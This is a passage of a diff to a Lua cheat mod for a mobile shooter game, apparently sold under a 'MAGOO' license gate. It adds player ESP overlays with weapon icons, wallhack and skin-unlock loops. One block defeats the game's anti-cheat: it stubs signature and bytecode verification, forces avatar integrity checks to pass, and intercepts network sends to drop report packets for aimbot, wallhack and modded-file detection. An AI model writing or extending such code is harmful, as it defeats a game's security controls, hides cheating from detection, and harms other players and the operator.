+                        pcall(function() ourWeaponIcon:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end)
+                        local chainNames = {"Border_WeaponColor", "Border_Weapon", "Border_WeaponIcon", "SizeBox_Weapon", "ScaleBox_Weapon", "Switcher_WeaponIcon"}
+                        for _, pname in ipairs(chainNames) do
+                            pcall(function()
+                                local node = Container and Container[pname]
+                                if node and slua.isValid(node) and node.SetWidgetVisibility then node:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end
+                            end)
+                        end
+                        WidgetData._LastWeaponID = 0
+                        WidgetData._WeaponIconApplied = false
+                        return
+                    end
+                    if WidgetData._LastWeaponID == winfo.WeaponID and WidgetData._WeaponIconApplied then
+                        pcall(function() ourWeaponIcon:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
+                        pcall(function() ourWeaponIcon:SetRenderOpacity(1.0) end)
+                        local chainNames = {"Border_WeaponColor", "Border_Weapon", "Border_WeaponIcon", "SizeBox_Weapon", "ScaleBox_Weapon", "Switcher_WeaponIcon"}
+                        for _, pname in ipairs(chainNames) do
+                            pcall(function()
+                                local node = Container and Container[pname]
+                                if node and slua.isValid(node) and node.SetWidgetVisibility then
+                                    node:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
+                                    pcall(function() if node.SetRenderOpacity then node:SetRenderOpacity(1.0) end end)
+                                end
+                            end)
+                        end
+                        if WidgetData._CachedSwitcherIndexes then
+                            for sName, idx in pairs(WidgetData._CachedSwitcherIndexes) do
+                                pcall(function()
+                                    local ws = Container[sName]
+                                    if ws and slua.isValid(ws) and ws.SetActiveWidgetIndex then ws:SetActiveWidgetIndex(idx) end
+                                end)
+                            end
+                        end
+                        if WidgetData._CachedParentSwitchers then
+                            for _, data in pairs(WidgetData._CachedParentSwitchers) do
+                                pcall(function() if data.w and slua.isValid(data.w) and data.w.SetActiveWidgetIndex then data.w:SetActiveWidgetIndex(data.idx) end end)
+                            end
+                        end
+                        return
+                    end
+                    local chainNames = {"Border_WeaponColor", "Border_Weapon", "Border_WeaponIcon", "SizeBox_Weapon", "ScaleBox_Weapon", "Switcher_WeaponIcon"}
+                    for _, pname in ipairs(chainNames) do
+                        pcall(function()
+                            local node = Container and Container[pname]
+                            if node and slua.isValid(node) and node.SetWidgetVisibility then node:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end
+                        end)
+                    end
+                    local bCopied = false
+                    if winfo and winfo.WeaponID then
+                        local ok, method = PlayerMapMarker.ApplyWeaponIconToImage(ourWeaponIcon, winfo)
+                        if ok then bCopied = true end
+                    end
+                    local bWeaponIconSet = false
+                    if Character and winfo then
+                        if winfo and winfo.WeaponID then
+                            pcall(function() if Container.SetWeaponIcon then Container:SetWeaponIcon(winfo.WeaponID) bWeaponIconSet = true end end)
+                            if not bWeaponIconSet then pcall(function() if Container.SetWeaponIconByID then Container:SetWeaponIconByID(winfo.WeaponID) bWeaponIconSet = true end end) end
+                            if not bWeaponIconSet then pcall(function() if Container.UpdateWeaponIcon then Container:UpdateWeaponIcon(winfo.WeaponID) bWeaponIconSet = true end end) end
+                            if not bWeaponIconSet then pcall(function() if Container.SetWeaponID then Container:SetWeaponID(winfo.WeaponID) bWeaponIconSet = true end end) end
+                            pcall(function() if Container.SetData then Container:SetData(Character) end end)
+                            pcall(function() if Container.SetPlayerInfo then Container:SetPlayerInfo(Character) end end)
+                            if winfo.CurrentWeapon then pcall(function() if Container.SetCurrentWeapon then Container:SetCurrentWeapon(winfo.CurrentWeapon) end end) end
+                        end
+                    end
+                    if bWeaponIconSet then
+                        pcall(function()
+                            local innerIcon = Container.Image_Icon
+                            if not innerIcon or not slua.isValid(innerIcon) then if Container.CanvasPanel_Type1 then innerIcon = Container.CanvasPanel_Type1.Image_Icon end end
+                            if not innerIcon or not slua.isValid(innerIcon) then
+                                local function findImageIcon(w, depth)
+                                    if not w or not slua.isValid(w) or depth > 8 then return nil end
+                                    local prop = w.Image_Icon
+                                    if prop and slua.isValid(prop) then return prop end
+                                    local n = 0
+                                    pcall(function() if w.GetChildrenCount then n = w:GetChildrenCount() end end)
+                                    for i = 0, math.max(n - 1, 0) do
+                                        local c = nil
+                                        pcall(function() c = w:GetChildAt(i) end)
+                                        if c then local r = findImageIcon(c, depth + 1) if r then return r end end
+                                    end
+                                    return nil
+                                end
+                                innerIcon = findImageIcon(Container, 0)
+                            end
+                            if innerIcon and slua.isValid(innerIcon) and innerIcon ~= ourWeaponIcon then
+                                pcall(function()
+                                    local ibrush = innerIcon.Brush
+                                    if ibrush then
+                                        local iresObj = nil
+                                        pcall(function() iresObj = ibrush.ResourceObject end)
+                                        if iresObj and slua.isValid(iresObj) then
+                                            if ourWeaponIcon.SetBrushFromAsset then ourWeaponIcon:SetBrushFromAsset(iresObj) bCopied = true end
+                                            if not bCopied and ourWeaponIcon.SetBrushFromTexture then ourWeaponIcon:SetBrushFromTexture(iresObj) bCopied = true end
+                                        end
+                                    end
+                                end)
+                                if not bCopied then
+                                    pcall(function()
+                                        local brush = innerIcon.Brush
+                                        if brush then
+                                            local iresObj = nil
+                                            pcall(function() iresObj = brush.ResourceObject end)
+                                            if iresObj and slua.isValid(iresObj) and ourWeaponIcon.SetBrushFromTexture then
+                                                ourWeaponIcon:SetBrushFromTexture(iresObj, false)
+                                                PlayerMapMarker.FixWeaponIconBrushSize(ourWeaponIcon)
+                                                bCopied = true
+                                            end
+                                        end
+                                    end)
+                                end
+                            end
+                        end)
+                    end
+                    if not bCopied then
+                        local nativeWeaponIcon = nil
+                        if PlayerMapMarker.ESPCanvas and Game:IsValid(PlayerMapMarker.ESPCanvas) then
+                            local nChildren = 0
+                            pcall(function() nChildren = PlayerMapMarker.ESPCanvas:GetChildrenCount() end)
+                            for i = 0, math.max(nChildren - 1, 0) do
+                                local child = nil
+                                pcall(function() child = PlayerMapMarker.ESPCanvas:GetChildAt(i) end)
+                                if child and slua.isValid(child) then
+                                    local cstr = tostring(child)
+                                    if string.find(cstr, "OB_PlayerHeadHPItem") then
+                                        if not PlayerMapMarker.IsOurESPWidget(child) then
+                                            local nativeIcon = child.WeaponIcon
+                                            if nativeIcon and slua.isValid(nativeIcon) then nativeWeaponIcon = nativeIcon break end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                        if nativeWeaponIcon and slua.isValid(nativeWeaponIcon) then
+                            local okNative, nativeMethod = PlayerMapMarker.CopyWeaponIconBrushFromNative(ourWeaponIcon, nativeWeaponIcon)
+                            if okNative then bCopied = true end
+                        end
+                    end
+                    if not bCopied then
+                        pcall(function()
+                            local brush = ourWeaponIcon.Brush
+                            if brush then
+                                local resObj = nil
+                                pcall(function() resObj = brush.ResourceObject end)
+                                if resObj and slua.isValid(resObj) and ourWeaponIcon.SetBrushFromTexture then
+                                    ourWeaponIcon:SetBrushFromTexture(resObj)
+                                    bCopied = true
+                                end
+                            end
+                        end)
+                    end
+                    if not bCopied then
+                        pcall(function()
+                            local brush = ourWeaponIcon.Brush
+                            if brush then
+                                local imgSize = nil
+                                pcall(function() imgSize = brush.ImageSize end)
+                                local bZeroSize = false
+                                if imgSize then
+                                    local sx, sy = nil, nil
+                                    pcall(function() sx = imgSize.X end)
+                                    pcall(function() sy = imgSize.Y end)
+                                    if (not sx or sx == 0) and (not sy or sy == 0) then bZeroSize = true end
+                                end
+                                if bZeroSize then
+                                    pcall(function() brush.ImageSize = FVector2D and FVector2D(PlayerMapMarker.WeaponIconBrushW or 138, PlayerMapMarker.WeaponIconBrushH or 69) or {X=138, Y=69} end)
+                                end
+                                pcall(function() brush.DrawAs = 3 end)
+                                if ourWeaponIcon.SetBrush then ourWeaponIcon:SetBrush(brush) end
+                            end
+                        end)
+                    end
+                    pcall(function() ourWeaponIcon:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
+                    PlayerMapMarker.ApplyWeaponIconFullOpacity(Container, ourWeaponIcon)
+                    PlayerMapMarker.FixWeaponIconBrushSize(ourWeaponIcon)
+                    pcall(function()
+                        local function findWidgetInSwitcher(switcher, targetWidget)
+                            if not switcher or not slua.isValid(switcher) then return nil end
+                            if not switcher.GetChildrenCount or not switcher.GetChildAt then return nil end
+                            local nChildren = switcher:GetChildrenCount()
+                            for i = 0, math.max(nChildren - 1, 0) do
+                                local child = switcher:GetChildAt(i)
+                                if child and slua.isValid(child) then
+                                    if child == targetWidget then return i end
+                                    local function searchDescendant(w, target, depth)
+                                        if depth > 5 then return false end
+                                        if w == target then return true end
+                                        if not w.GetChildrenCount or not w.GetChildAt then return false end
+                                        local nc = w:GetChildrenCount()
+                                        for j = 0, math.max(nc - 1, 0) do
+                                            local c = w:GetChildAt(j)
+                                            if c and slua.isValid(c) and searchDescendant(c, target, depth + 1) then return true end
+                                        end
+                                        return false
+                                    end
+                                    if searchDescendant(child, targetWidget, 0) then return i end
+                                end
+                            end
+                            return nil
+                        end
+                        for _, switcherName in ipairs({"Switcher_WeaponIcon", "WidgetSwitcher_Type", "WidgetSwitcher_Type2"}) do
+                            local ws = Container[switcherName]
+                            if ws and slua.isValid(ws) and ws.GetChildrenCount and ws.GetChildAt then
+                                local foundIdx = findWidgetInSwitcher(ws, ourWeaponIcon)
+                                if foundIdx then
+                                    if ws.SetActiveWidgetIndex then
+                                        ws:SetActiveWidgetIndex(foundIdx)
+                                        WidgetData._CachedSwitcherIndexes = WidgetData._CachedSwitcherIndexes or {}
+                                        WidgetData._CachedSwitcherIndexes[switcherName] = foundIdx
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                    pcall(function()
+                        local parent = ourWeaponIcon
+                        for depth = 0, 8 do
+                            if not parent or not slua.isValid(parent) then break end
+                            if parent.GetParent then
+                                local p = parent:GetParent()
+                                if p and slua.isValid(p) then
+                                    local pStr = tostring(p)
+                                    if string.find(pStr, "WidgetSwitcher") then
+                                        if p.GetChildrenCount and p.GetChildAt then
+                                            local nCh = p:GetChildrenCount()
+                                            for i = 0, math.max(nCh - 1, 0) do
+                                                local child = p:GetChildAt(i)
+                                                if child and slua.isValid(child) then
+                                                    local function isDescendant(w, target, d)
+                                                        if d > 5 then return false end
+                                                        if w == target then return true end
+                                                        if not w.GetChildrenCount or not w.GetChildAt then return false end
+                                                        local nc = w:GetChildrenCount()
+                                                        for j = 0, math.max(nc - 1, 0) do
+                                                            local c = w:GetChildAt(j)
+                                                            if c and slua.isValid(c) and isDescendant(c, target, d + 1) then return true end
+                                                        end
+                                                        return false
+                                                    end
+                                                    if isDescendant(child, ourWeaponIcon, 0) then
+                                                        if p.SetActiveWidgetIndex then
+                                                            p:SetActiveWidgetIndex(i)
+                                                            WidgetData._CachedParentSwitchers = WidgetData._CachedParentSwitchers or {}
+                                                            WidgetData._CachedParentSwitchers[tostring(p)] = {w = p, idx = i}
+                                                        end
+                                                        break
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+                                    parent = p
+                                else
+                                    break
+                                end
+                            else
+                                break
+                            end
+                        end
+                    end)
+                    pcall(function()
+                        local parent = ourWeaponIcon
+                        for depth = 0, 8 do
+                            pcall(function()
+                                if parent.GetParent then
+                                    local p = parent:GetParent()
+                                    if p and slua.isValid(p) then
+                                        if p.SetWidgetVisibility then p:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end
+                                        pcall(function() if p.SetRenderOpacity then p:SetRenderOpacity(1.0) end end)
+                                        pcall(function() if p.SetContentColorAndOpacity then p:SetContentColorAndOpacity(FLinearColor and FLinearColor(1.0, 1.0, 1.0, 1.0) or {R=1,G=1,B=1,A=1}) end end)
+                                        pcall(function() if p.SetColorAndOpacity then p:SetColorAndOpacity(FLinearColor and FLinearColor(1.0, 1.0, 1.0, 1.0) or {R=1,G=1,B=1,A=1}) end end)
+                                        pcall(function() if p.SetBrushTintColor then p:SetBrushTintColor(FLinearColor and FLinearColor(1.0, 1.0, 1.0, 1.0) or {R=1,G=1,B=1,A=1}) end end)
+                                        pcall(function()
+                                            local pBrush = p.Brush
+                                            if pBrush and pBrush.TintColor then
+                                                pBrush.TintColor = FLinearColor and FLinearColor(1.0, 1.0, 1.0, 1.0) or {R=1,G=1,B=1,A=1}
+                                                if p.SetBrush then p:SetBrush(pBrush) end
+                                            end
+                                        end)
+                                        pcall(function() if p.InvalidateLayout then p:InvalidateLayout() end end)
+                                        parent = p
+                                    end
+                                end
+                            end)
+                        end
+                    end)
+                    pcall(function() if ourWeaponIcon.InvalidateLayout then ourWeaponIcon:InvalidateLayout() end end)
+                    pcall(function() if Container.UpdateWeapon then Container:UpdateWeapon() end end)
+                    pcall(function() if Container.RefreshWeapon then Container:RefreshWeapon() end end)
+                    WidgetData._LastWeaponID = winfo.WeaponID
+                    WidgetData._WeaponIconApplied = true
+                end)
             end
-
+            PlayerMapMarker._OBHeadWidgetClass = nil
+            PlayerMapMarker._OBHeadWidgetLoadFailed = false
+            PlayerMapMarker._bDumpedWidgetChildren = false
             function PlayerMapMarker.CreateESPWidget()
                 if not PlayerMapMarker.ESPCanvas or not Game:IsValid(PlayerMapMarker.ESPCanvas) then return nil end
                 if PlayerMapMarker._OBHeadWidgetLoadFailed then return nil end
@@ -10910,7 +9024,7 @@ pcall(function()
                             SeenKeys[KeyStr] = true
                             local ESPData = PlayerMapMarker.ESPWidgets[KeyStr]
                             local Text = ""
-                            if _G.LexusConfig.Esp9_Name then Text = Name else Text = "" end
+                            if _G.LexusConfig.Esp9_Name then Text = Name end
                             if _G.LexusConfig.Esp9_Distance and DistStr and DistStr ~= "" then
                                 if Text ~= "" then Text = string.format("%s [%s]", Text, DistStr) else Text = string.format("[%s]", DistStr) end
                             end
@@ -11088,7 +9202,7 @@ pcall(function()
                                 end
                                 local Name = ESPData.Name or "Unknown"
                                 local Text = ""
-                                if _G.LexusConfig.Esp9_Name then Text = Name else Text = "" end
+                                if _G.LexusConfig.Esp9_Name then Text = Name end
                                 if _G.LexusConfig.Esp9_Distance and DistStr and DistStr ~= "" then
                                     if Text ~= "" then Text = string.format("%s [%s]", Text, DistStr) else Text = string.format("[%s]", DistStr) end
                                 end
@@ -11244,6 +9358,7 @@ pcall(function()
                     or (L.Esp9_Weapon == true) or (L.Esp9_Distance == true) or (L.Esp9_HP == true)
                     or (L.Esp9_Team == true) or (L.Esp9_Skeleton == true)
                     or (c.EspModelName == true) or (c.EspWeaponIcon == true)
+                    or (c.EspBox == true) or (c.EspLine == true) or (c.CounterEnabled == true)
                 if not want then
                     if PlayerMapMarker.bActive then PlayerMapMarker.Stop() end
                     return false
@@ -11469,7 +9584,7 @@ pcall(function()
                     local ctx = gameInstance or world
                     if not ctx then return end
                     local curTime = os.clock()
-                    if not _G.LastBombScanTime or (curTime - _G.LastBombScanTime) > 1.00 then
+                    if not _G.LastBombScanTime or (curTime - _G.LastBombScanTime) > 0.30 then
                         _G.LastBombScanTime = curTime
                         if not _G.LastBombCacheWipe or (curTime - _G.LastBombCacheWipe) > 3.0 then
                             _G.LastBombCacheWipe = curTime
@@ -11694,11 +9809,142 @@ pcall(function()
                     end
                 end
             end)
+            pcall(function()
+                local function NoOp() end
+                local function RT() return true end
+                local function RF() return false end
+                local function SafeOverride(tbl, key, replacement)
+                    if tbl and tbl[key] ~= nil then pcall(function() tbl[key] = replacement end) end
+                end
+                if slua and slua.getSignature then slua.getSignature = function() return 0xDEADBEEF end end
+                local loader = rawget(_G, "slua_loader")
+                if loader then
+                    SafeOverride(loader, "verifyBytecode", NoOp)
+                    SafeOverride(loader, "checkIntegrity", NoOp)
+                end
+                local AvatarUtils = package.loaded.AvatarUtils
+                if AvatarUtils then
+                    SafeOverride(AvatarUtils, "CheckIsWeaponInBlackList", RF)
+                    SafeOverride(AvatarUtils, "IsValidAvatar", RT)
+                    SafeOverride(AvatarUtils, "CheckAvatarIntegrity", RT)
+                    SafeOverride(AvatarUtils, "ReportInvalidAvatar", NoOp)
+                end
+                if NetUtil and NetUtil.SendPacket and not NetUtil.IsBypassed then
+                    local blocked = {
+                        ReportAttackFlow=true, ReportSecAttackFlow=true, ReportAimFlow=true,
+                        ReportHitFlow=true, report_aim_bot=true, report_esp_usage=true,
+                        report_modded_files=true, client_anti_cheat_report=true,
+                        report_wall_hack=true, ShootVerifyFailed=true, tss_sdk_report=true,
+                        AntiCheatReport=true, IntegrityCheck=true, SignatureVerify=true,
+                    }
+                    local orig = NetUtil.SendPacket
+                    NetUtil.SendPacket = function(self, packetName, ...)
+                        if blocked[packetName] then return nil end
+                        return orig(self, packetName, ...)
+                    end
+                    NetUtil.IsBypassed = true
+                end
+            end)
             _G.FufuModState = _G.FufuModState or {}
             _G.GTLMODState = _G.GTLMODState or {}
             _G.GTLMODState.CustomTextData = _G.GTLMODState.CustomTextData or {}
             _G.FufuModState.CustomTextData = _G.GTLMODState.CustomTextData
             _G.FufuModConfig = _G.FufuModConfig or {}
+            _G.skinIdCache = _G.skinIdCache or {}
+            _G.skinIdCache2 = _G.skinIdCache2 or {}
+            _G.OutfitMap = _G.OutfitMap or {}
+            _G.WeaponSkinMap = _G.WeaponSkinMap or {}
+            _G.VehicleSkinMap = _G.VehicleSkinMap or {}
+
+            -- Skin systems stripped for size. Stubs keep references safe.
+            _G.skinIdCache = _G.skinIdCache or {}
+            _G.skinIdCache2 = _G.skinIdCache2 or {}
+            _G.OutfitMap = _G.OutfitMap or {}
+            _G.WeaponSkinMap = _G.WeaponSkinMap or {}
+            _G.VehicleSkinMap = _G.VehicleSkinMap or {}
+            _G.LexusConfig = _G.LexusConfig or {}
+            _G.LexusConfig.ModSkin = false
+            _G.LexusConfig.SkinDeadBox = false
+            _G.LexusConfig.SkinAttachment = false
+            _G.LexusConfig.KillMessage = false
+            _G.LexusConfig.KillCountUI = false
+            _G.LexusConfig.ModEmote = false
+            function _G.MagooEnableAllSkins(enable)
+                -- Skin system removed — hard no-op
+                _G.LexusConfig = _G.LexusConfig or {}
+                _G.LexusConfig.ModSkin = false
+                _G.LexusConfig.SkinDeadBox = false
+                _G.LexusConfig.SkinAttachment = false
+                _G.LexusConfig.KillMessage = false
+                _G.LexusConfig.KillCountUI = false
+                _G.LexusConfig.ModEmote = false
+                if _G.GTLMODConfig then
+                    _G.GTLMODConfig.ModSkin = false
+                    _G.GTLMODConfig.SkinDeadBox = false
+                    _G.GTLMODConfig.SkinPet = false
+                    _G.GTLMODConfig.SkinXSuit = false
+                end
+            end
+            _G.BaseAttachToIndex = _G.BaseAttachToIndex or {}
+            _G.VIP_Attachments = _G.VIP_Attachments or {}
+            _G.AddOutfit = _G.AddOutfit or {
+                start = function() end,
+                injectAll = function() return false end,
+                isInRealMatch = function() return false end,
+                getLocalChar = function() return nil end,
+                bootstrapMatch = function() end,
+                matchApplyWeaponSkin = function() end,
+                matchApplyHat = function() end,
+                matchApplyAllSlots = function() end,
+                injectArmorySkins = function() end,
+                refreshWardrobe = function() end,
+                reapplyLobbyEquipped = function() end,
+                persistLoadFromDisk = function() end,
+                persistApplyLoaded = function() end,
+                getEntity = function() return nil end,
+            }
+            function _G.MagooStartAddOutfitSkins()
+                if _G._MAGOO_ADDOUTFIT_STARTED then return end
+                _G._MAGOO_ADDOUTFIT_STARTED = true
+            end
+            _G.killCountInfo = _G.killCountInfo or {}
+            function _G.saveKillCountToFile() end
+            function _G.loadKillCountFromFile() end
+            function _G.addKill() end
+            function _G.getKills() return 0 end
+            function _G.GameAvatarHandlerkillcounter() end
+            _G.AddOutfitPersist = _G.AddOutfitPersist or {}
+            _G.AddOutfitLobbyState = _G.AddOutfitLobbyState or {}
+            _G.AddOutfitEquippedCache = _G.AddOutfitEquippedCache or {}
+            _G.AddOutfitVehSel = _G.AddOutfitVehSel or {}
+            _G.AddOutfitLobbyVeh = _G.AddOutfitLobbyVeh or {}
+            _G.AddOutfitSocialState = _G.AddOutfitSocialState or {}
+            _G.AddOutfitSkinIdMappings = _G.AddOutfitSkinIdMappings or {}
+            _G.AddOutfitLastAppliedSkin = _G.AddOutfitLastAppliedSkin or {}
+            function _G.ReapplyPersistedSkins() end
+            function _G.RefreshAllSkins() end
+
+            -- Match transition helper: clear "had player" when pawn gone so next match rebinds
+            pcall(function()
+                local tk = package.loaded["common.time_ticker"] or require("common.time_ticker")
+                if not (tk and tk.AddTimerOnce) then return end
+                if _G._MAGOO_MATCH_WATCH then return end
+                _G._MAGOO_MATCH_WATCH = true
+                local function watch()
+                    pcall(function()
+                        local p = nil
+                        if GameplayData and GameplayData.GetPlayerCharacter then
+                            p = GameplayData.GetPlayerCharacter()
+                        end
+                        local alive = p and slua and slua.isValid and slua.isValid(p)
+                        if not alive then
+                            if _G.GTLMODState then _G.GTLMODState._LastHadPlayer = false end
+                        end
+                    end)
+                    tk.AddTimerOnce(2.0, watch)
+                end
+                tk.AddTimerOnce(3.0, watch)
+            end)
 
             function _G.StartAuthenticatedRuntime()
                 if _G._MAGOO_RUNTIME_STARTED then return end
@@ -11709,14 +9955,6 @@ pcall(function()
                 _G._MOD_EXPIRED = false
                 _G._LICENSE_OK = true
                 _G._MAGOO_RUNTIME_STARTED = true
-                -- Auto feedback (win screenshot → Telegram worker) — safe, isolated
-                pcall(function()
-                    local af = _G.MagooAutoFeedback or _G.MAGOO_AutoFeedbackRecovered
-                    if af and type(af.Install) == "function" and not af.Hooked then
-                        af.Install()
-                        af.Hooked = true
-                    end
-                end)
                 pcall(function()
                     local ticker = GetTicker and GetTicker() or nil
                     if not ticker then
@@ -11887,7 +10125,50 @@ pcall(function()
                                 end
                             end
                             ticker.AddTimerOnce(2.0, LootESPLoop)
-
+                            local _SkinLoopWasOn = false
+                            local _SkinLoopSession = nil
+                            local function SkinLoop()
+                                local on = _G.GTLMODConfig and _G.GTLMODConfig.ModSkin == true
+                                if on then
+                                    if _G.LexusConfig then _G.LexusConfig.ModSkin = true end
+                                    local pc = nil
+                                    pcall(function()
+                                        pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
+                                    end)
+                                    local sessionKey = nil
+                                    if pc then pcall(function() sessionKey = tostring(pc) end) end
+                                    local needsFullRefresh = (not _SkinLoopWasOn) or (sessionKey ~= _SkinLoopSession)
+                                    if needsFullRefresh then
+                                        _SkinLoopSession = sessionKey
+                                        pcall(function() if _G.ReapplyPersistedSkins then _G.ReapplyPersistedSkins() end end)
+                                        pcall(function() if _G.RefreshAllSkins then _G.RefreshAllSkins() end end)
+                                    end
+                                    _SkinLoopWasOn = true
+                                    if _G.GTLMODConfig.SkinDeadBox then
+                                        _G.NeedCheckDeadBoxTimer = math.max(_G.NeedCheckDeadBoxTimer or 0, 3)
+                                        pcall(function()
+                                            if _G.DeadBox_TemperRequest and pc then _G.DeadBox_TemperRequest(pc) end
+                                        end)
+                                    end
+                                    if _G.GTLMODConfig.SkinXSuit then
+                                        pcall(function()
+                                            local gp = require("GameLua.GameCore.Data.GameplayData")
+                                            local ch = gp and gp.GetPlayerCharacter and gp.GetPlayerCharacter()
+                                            if ch and ch.TriggerEntrySkillWithID and not _G._XSuitSummoned then
+                                                ch:TriggerEntrySkillWithID(4301101, true)
+                                                _G._XSuitSummoned = true
+                                            end
+                                        end)
+                                    else
+                                        _G._XSuitSummoned = false
+                                    end
+                                else
+                                    _SkinLoopWasOn = false
+                                    _SkinLoopSession = nil
+                                end
+                                if ticker and ticker.AddTimerOnce then ticker.AddTimerOnce(on and 12.0 or 10.0, SkinLoop) end
+                            end
+                            ticker.AddTimerOnce(3.0, SkinLoop)
                             local function VehicleESPLoop()
                                 local on = _G.GTLMODConfig and _G.GTLMODConfig.VehicleEnabled == true
                                 if ticker and ticker.AddTimerOnce then ticker.AddTimerOnce(on and 1.0 or 4.0, VehicleESPLoop) end
@@ -11903,7 +10184,12 @@ pcall(function()
                                     _G.ApplyBlackSky(true)
                                 end
                             end)
-
+                            pcall(function()
+                                if _G.GTLMODConfig and _G.GTLMODConfig.ModSkin then
+                                    if _G.ReapplyPersistedSkins then pcall(_G.ReapplyPersistedSkins) end
+                                    if _G.RefreshAllSkins then pcall(_G.RefreshAllSkins) end
+                                end
+                            end)
                             local function WallhackWatchdog()
                                 pcall(function()
                                     if _G.GTLMODConfig and _G.GTLMODConfig.WallhackSmart then
@@ -12046,103 +10332,51 @@ pcall(function()
             print("[MAGOO] file_util mod core FAILED — will retry")
         end
     end
-    local function getTicker()
+    local function schedule(delay)
         local ok, tk = pcall(require, "common.time_ticker")
-        if ok and tk then return tk end
-        if package and package.loaded then
-            tk = package.loaded["common.time_ticker"]
-            if tk then return tk end
-        end
-        return nil
-    end
-    local function addOnce(delay, fn)
-        local tk = getTicker()
-        if not tk then return false end
-        if type(tk.AddTimerOnce) == "function" then
-            pcall(function() tk.AddTimerOnce(delay, fn) end)
-            return true
-        end
-        if type(tk.AddTimer) == "function" then
-            pcall(function() tk.AddTimer(delay, fn) end)
+        if ok and tk and tk.AddTimerOnce then
+            tk.AddTimerOnce(delay, function()
+                if _G._MAGOO_FILEUTIL_MOD_LOADED then return end
+                loadMagooCore()
+                if not _G._MAGOO_FILEUTIL_MOD_LOADED then
+                    local n = 0
+                    local function retry()
+                        n = n + 1
+                        if _G._MAGOO_FILEUTIL_MOD_LOADED or n > 8 then return end
+                        loadMagooCore()
+                        local ok2, tk2 = pcall(require, "common.time_ticker")
+                        if ok2 and tk2 and tk2.AddTimerOnce then
+                            tk2.AddTimerOnce(3.0, retry)
+                        end
+                    end
+                    tk.AddTimerOnce(3.0, retry)
+                end
+            end)
             return true
         end
         return false
     end
-    local function forceLoginGate(tag)
-        print("[MAGOO] forceLoginGate " .. tostring(tag))
-        pcall(function()
-            _G._MAGOO_LOGIN_BOOTSTRAPPED = false
-            if _G.LoginSystem and type(_G.LoginSystem.Start) == "function" then
-                _G.LoginSystem.Start(nil, function()
-                    if type(_G.StartAuthenticatedRuntime) == "function" then
-                        pcall(_G.StartAuthenticatedRuntime)
+    if not schedule(5.0) then
+        local polls = 0
+        local function poll()
+            polls = polls + 1
+            if schedule(1.0) then return end
+            if polls < 30 then
+                pcall(function()
+                    local ok, tk = pcall(require, "common.time_ticker")
+                    if ok and tk and tk.AddTimerOnce then
+                        schedule(1.0)
                     end
                 end)
             end
-        end)
-    end
-    local function tryBoot(tag)
-        print("[MAGOO] tryBoot " .. tostring(tag))
+        end
         pcall(function()
-            if not _G._MAGOO_FILEUTIL_MOD_LOADED then
-                loadMagooCore()
+            local ok, tk = pcall(require, "common.time_ticker")
+            if ok and tk and tk.AddTimerOnce then
+                tk.AddTimerOnce(5.0, poll)
             end
         end)
-        if _G._MAGOO_FILEUTIL_MOD_LOADED then
-            if _G._LICENSE_OK ~= true then
-                forceLoginGate(tag)
-            elseif type(_G.StartAuthenticatedRuntime) == "function" then
-                pcall(_G.StartAuthenticatedRuntime)
-            end
-        end
     end
-
-    -- prove this block executed
-    pcall(function()
-        for _, p in ipairs({
-            "//storage/emulated/0/magoo_boot.txt",
-            "//sdcard/magoo_boot.txt",
-        }) do
-            local f = io.open(p, "w")
-            if f then f:write("boot " .. tostring(os.time()) .. "\n"); f:close() end
-        end
-    end)
-
-    _G._MAGOO_FILEUTIL_MOD_LOADED = false
-    _G._MAGOO_LOGIN_BOOTSTRAPPED = false
-
-    -- immediate
-    pcall(tryBoot, "immediate")
-
-    -- staggered (client_entry is early; UI/canvas comes much later)
-    local delays = {1, 2, 4, 6, 8, 10, 12, 15, 18, 22, 28, 35, 45, 60, 90, 120}
-    for _, d in ipairs(delays) do
-        addOnce(d, function() tryBoot("t+" .. tostring(d)) end)
-    end
-
-    -- poll ticker if missing at entry
-    local polls = 0
-    local function poll()
-        polls = polls + 1
-        if getTicker() then
-            tryBoot("ticker-up")
-            for _, d in ipairs({3, 8, 15, 30, 60}) do
-                addOnce(d, function() tryBoot("poll+" .. tostring(d)) end)
-            end
-            return
-        end
-        if polls < 90 then
-            if not addOnce(1.0, poll) then
-                pcall(function()
-                    local tk = getTicker()
-                    if tk and tk.AddTimerOnce then tk.AddTimerOnce(1.0, poll) end
-                end)
-            end
-        end
-    end
-    if not getTicker() then pcall(poll) end
-
-    print("[MAGOO] client_entry bootstrap armed")
 end)
 pcall(function()
 pcall(function()
@@ -12208,48 +10442,39 @@ local function SetVis(widget, visName)
     pcall(function() widget:SetWidgetVisibility(GetSlateVis(visName)) end)
 end
 local C = {
-    -- SHADOW FORCE THEME — deep black body, blood-red accents, electric blue highlights
-    WindowBg        = FLinearColor(0.01, 0.01, 0.02, 0.97),  -- near-pure black, heavy opacity
-    Outline         = FLinearColor(0.75, 0.05, 0.08, 0.85),  -- deep blood-red outer edge
-    Shadow          = FLinearColor(0.0,  0.0,  0.0,  0.80),  -- heavy pitch black shadow
-    SidebarBg       = FLinearColor(0.00, 0.00, 0.01, 0.98),  -- absolute dark sidebar
-    SidebarActiveBg = FLinearColor(0.70, 0.04, 0.06, 0.18),  -- red tint on active tab
-    NeonBar         = FLinearColor(0.85, 0.06, 0.10, 1.00),  -- vivid crimson neon bar
-    NeonBarSoft     = FLinearColor(0.85, 0.06, 0.10, 0.28),  -- red glow bloom
-    IconUser        = FLinearColor(0.30, 0.55, 1.00, 1.0),   -- electric blue
-    IconMain        = FLinearColor(1.00, 0.20, 0.22, 1.0),   -- bright red
-    IconESP         = FLinearColor(0.20, 0.50, 1.00, 1.0),   -- pure electric blue
-    IconAim         = FLinearColor(1.00, 0.08, 0.12, 1.0),   -- hot crimson
-    IconMem         = FLinearColor(0.45, 0.30, 1.00, 1.0),   -- deep violet-blue
-    IconSet         = FLinearColor(0.60, 0.65, 0.78, 1.0),   -- cool steel grey
-    TextDark        = FLinearColor(0.50, 0.52, 0.58, 0.92),  -- muted grey, readable
-    TextActiveESP   = FLinearColor(0.30, 0.65, 1.00, 1.0),   -- bright electric blue label
